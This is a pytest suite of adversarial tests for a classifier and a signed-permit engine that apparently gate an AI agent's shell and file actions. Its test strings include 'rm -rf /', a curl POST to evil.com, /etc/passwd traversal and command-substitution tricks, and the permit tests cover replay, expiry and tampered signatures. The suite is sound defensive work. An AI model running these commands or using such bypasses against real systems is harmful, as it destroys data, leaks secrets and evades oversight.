"""
tests/test_security_attacks.py

Phase 8 Security Review & Adversarial Attack Suite per Section 33 of RUBICON_INSTRUCTION.md.
Tests classifier bypasses, permit bypasses, tamper-evident receipt verification,
and fail-closed invariants.
"""

import time
import json
import pytest
from pathlib import Path
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives import serialization

from core.classifier import Classifier
from core.models import ClassificationResult, EffectVector, PermitState
from core.permits import PermitEngine


@pytest.fixture
def classifier():
    return Classifier()


@pytest.fixture
def keypair(tmp_path):
    priv_key = Ed25519PrivateKey.generate()
    pub_key = priv_key.public_key()
    priv_file = tmp_path / "signer.key"
    pub_file = tmp_path / "verifier.pub.pem"
    priv_file.write_bytes(
        priv_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        )
    )
    pub_file.write_bytes(
        pub_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )
    )
    return priv_file, pub_file


@pytest.fixture
def permit_engine(tmp_path, keypair):
    priv_file, pub_file = keypair
    store_dir = tmp_path / "permits"
    return PermitEngine(
        permit_store_dir=store_dir,
        public_key_path=pub_file,
        private_key_path=priv_file,
    )


# =========================================================================
# 1. CLASSIFIER BYPASS ATTACKS (Section 33)
# =========================================================================

def test_attack_uppercase_git_push(classifier):
    """Case-insensitive matching: 'GIT PUSH ORIGIN MAIN' must be classified OUTSIDE_ROLLBACK."""
    res, vec = classifier.classify("execute_command", {"command": "GIT PUSH ORIGIN MAIN"}, "test-sess")
    assert res == ClassificationResult.OUTSIDE_ROLLBACK
    assert "VCS_REMOTE" in vec.domains


def test_attack_whitespace_tricks(classifier):
    """Extra spaces, tabs, trailing spaces must normalize cleanly to OUTSIDE_ROLLBACK."""
    cmds = [
        "git    push   origin   main",
        "  git push origin main",
        "git push origin main   \t",
        "git\tpush\torigin\tmain",
    ]
    for cmd in cmds:
        res, vec = classifier.classify("execute_command", {"command": cmd}, "test-sess")
        assert res == ClassificationResult.OUTSIDE_ROLLBACK, f"Failed on command: {repr(cmd)}"


def test_attack_nested_shell_opaque(classifier):
    """Opaque shell command wrapping must fail closed as UNKNOWN_EFFECT."""
    payloads = [
        "sh -c 'git push origin main'",
        "bash -c 'rm -rf /'",
        "powershell -Command Remove-Item -Recurse",
        "python -c 'import shutil; shutil.rmtree(\"src\")'",
        "node -e 'process.exit(1)'",
    ]
    for p in payloads:
        res, vec = classifier.classify("execute_command", {"command": p}, "test-sess")
        assert res == ClassificationResult.UNKNOWN_EFFECT, f"Failed to block opaque shell: {p}"
        assert "UNKNOWN" in vec.domains


def test_attack_path_traversal_write(classifier):
    """Path traversal in file writes must be blocked (OUTSIDE_ROLLBACK, UNKNOWN, or BOUNDARY)."""
    traversals = [
        "../../etc/passwd",
        "..\\..\\Windows\\System32\\cmd.exe",
        "%2e%2e/secret.env",
        "/tmp/outside_workspace.txt",
    ]
    for path in traversals:
        res, vec = classifier.classify("write_file", {"path": path, "content": "evil"}, "test-sess")
        # Must not be auto-allowed as COVERED_REVERSIBLE
        assert res != ClassificationResult.COVERED_REVERSIBLE, f"Path traversal allowed as covered: {path}"


def test_attack_compound_shell_redirection(classifier):
    """Piped and chained commands must not be allowed as COVERED_REVERSIBLE."""
    chained = [
        "git status && git push origin main",
        "npm test; curl -X POST https://evil.com/leak",
        "cat file | grep secret > /tmp/out",
        "git `echo push` origin main",
        "git $(echo push) origin main",
    ]
    for cmd in chained:
        res, vec = classifier.classify("execute_command", {"command": cmd}, "test-sess")
        assert res in (ClassificationResult.UNKNOWN_EFFECT, ClassificationResult.OUTSIDE_ROLLBACK), f"Failed on chained: {cmd}"


# =========================================================================
# 2. PERMIT BYPASS ATTACKS (Section 33)
# =========================================================================

def test_attack_stale_expired_permit(permit_engine):
    """Expired permit must be rejected immediately."""
    vec = EffectVector(
        action_id="act-exp",
        session_id="sess-01",
        tool="execute_command",
        normalized_action="git push origin main",
        domains=["VCS_REMOTE"],
        paths=[],
        network_targets=["origin"],
        process_lifetime="none",
        rollback_contract="OUTSIDE",
        observability="VERIFIABLE",
        decision="BLOCK",
        reason="remote",
    )
    pending = permit_engine.create_pending(vector=vec, head_commit="abcd1234")
    # Manually expire the permit
    pending.expires_at = time.time() - 10
    permit_engine._save(pending)

    # Attempting to sign expired permit fails
    with pytest.raises(ValueError, match="expired"):
        permit_engine.issue_signed(pending.permit_id)


def test_attack_permit_wrong_action_binding(permit_engine):
    """Permit issued for one action cannot be used for a different action."""
    vec = EffectVector(
        action_id="act-legit",
        session_id="sess-01",
        tool="execute_command",
        normalized_action="git push origin feature",
        domains=["VCS_REMOTE"],
        paths=[],
        network_targets=["origin"],
        process_lifetime="none",
        rollback_contract="OUTSIDE",
        observability="VERIFIABLE",
        decision="BLOCK",
        reason="remote",
    )
    pending = permit_engine.create_pending(vector=vec, head_commit="commit1")
    signed = permit_engine.issue_signed(pending.permit_id)

    # Attempt to use permit for git push origin main instead of git push origin feature
    valid, reason = permit_engine.validate_and_consume(
        permit_id=signed.permit_id,
        action_id="act-different",
        session_id="sess-01",
        tool="execute_command",
        normalized_action="git push origin main",
        head_commit="commit1",
    )
    assert not valid
    assert "binding" in reason.lower() or "mismatch" in reason.lower() or "action" in reason.lower()


def test_attack_permit_replay(permit_engine):
    """Single-use enforcement: a permit cannot be replayed twice."""
    vec = EffectVector(
        action_id="act-single",
        session_id="sess-01",
        tool="execute_command",
        normalized_action="npm publish",
        domains=["PACKAGE_REGISTRY"],
        paths=[],
        network_targets=[],
        process_lifetime="none",
        rollback_contract="OUTSIDE",
        observability="VERIFIABLE",
        decision="BLOCK",
        reason="registry",
    )
    pending = permit_engine.create_pending(vector=vec, head_commit="head-1")
    signed = permit_engine.issue_signed(pending.permit_id)

    # First use succeeds
    valid1, _ = permit_engine.validate_and_consume(
        permit_id=signed.permit_id,
        action_id="act-single",
        session_id="sess-01",
        tool="execute_command",
        normalized_action="npm publish",
        head_commit="head-1",
    )
    assert valid1

    # Second use fails
    valid2, reason2 = permit_engine.validate_and_consume(
        permit_id=signed.permit_id,
        action_id="act-single",
        session_id="sess-01",
        tool="execute_command",
        normalized_action="npm publish",
        head_commit="head-1",
    )
    assert not valid2
    assert "consumed" in reason2.lower() or "replay" in reason2.lower()


def test_attack_signature_corruption(permit_engine):
    """Corrupted permit signature must fail closed."""
    vec = EffectVector(
        action_id="act-corrupt",
        session_id="sess-01",
        tool="execute_command",
        normalized_action="git push origin main",
        domains=["VCS_REMOTE"],
        paths=[],
        network_targets=["origin"],
        process_lifetime="none",
        rollback_contract="OUTSIDE",
        observability="VERIFIABLE",
        decision="BLOCK",
        reason="remote",
    )
    pending = permit_engine.create_pending(vector=vec, head_commit="head-1")
    signed = permit_engine.issue_signed(pending.permit_id)

    # Tamper with the permit signature on disk
    store_file = permit_engine._store / f"{signed.permit_id}.json"
    data = json.loads(store_file.read_text(encoding="utf-8"))
    data["signature"] = "deadbeef" * 8
    store_file.write_text(json.dumps(data), encoding="utf-8")

    valid, reason = permit_engine.validate_and_consume(
        permit_id=signed.permit_id,
        action_id="act-corrupt",
        session_id="sess-01",
        tool="execute_command",
        normalized_action="git push origin main",
        head_commit="head-1",
    )
    assert not valid
    assert "signature" in reason.lower() or "invalid" in reason.lower()
